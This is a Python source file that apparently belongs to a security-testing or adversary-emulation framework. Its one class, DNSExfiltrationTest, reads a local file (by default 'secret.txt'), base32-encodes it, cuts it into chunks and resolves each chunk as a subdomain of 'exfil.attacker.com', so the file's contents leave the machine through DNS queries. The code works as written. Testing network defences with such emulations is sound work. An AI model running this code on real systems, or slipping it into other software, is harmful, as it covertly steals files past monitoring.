import base64
import socket
import time
import os
from typing import Dict
from executor.BaseTest import BaseTest  # Adjust path as needed

class DNSExfiltrationTest(BaseTest):
    TEST_NAME = "DNSExfiltrationTest"
    CATEGORY = "command_and_control"

    def run(self, config: Dict) -> Dict:
        common = config.get("common", {})
        params = config.get("parameters", {})

        self.test_results["source_ip"] = common.get("source_ip")
        self.test_results["source_hostname"] = common.get("source_hostname")
        self.test_results["dest_ip"] = common.get("dest_ip")
        self.test_results["dest_hostname"] = common.get("dest_hostname")
        self.test_results["dest_port"] = common.get("dest_port")
        self.test_results["proxy"] = common.get("proxy")
        self.test_results["comment"] = common.get("comment")

        domain = params.get("domain", "exfil.attacker.com")
        file_path = params.get("file", "secret.txt")
        chunk_size = int(params.get("chunk_size", 32))
        delay = float(params.get("delay", 1))

        if not os.path.exists(file_path):
            error_msg = f"File not found: {file_path}"
            self.print_output(error_msg)
            return {"status": "fail", "output": error_msg}

        try:
            with open(file_path, "rb") as f:
                data = f.read()
            encoded = base64.b32encode(data).decode()

            chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
            self.print_output(f"[*] Sending {len(chunks)} DNS queries to domain: {domain}")

            for i, chunk in enumerate(chunks):
                subdomain = f"{chunk.lower()}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                    self.test_results["steps"].append({"step": i, "query": subdomain, "status": "ok"})
                except socket.gaierror:
                    self.test_results["steps"].append({"step": i, "query": subdomain, "status": "failed"})

                time.sleep(delay)

            return {"status": "success", "output": f"Exfiltrated {file_path} via DNS to {domain}"}

        except Exception as e:
            self.print_output(f"[!] DNS exfiltration failed: {e}")
            return {"status": "fail", "output": str(e)}
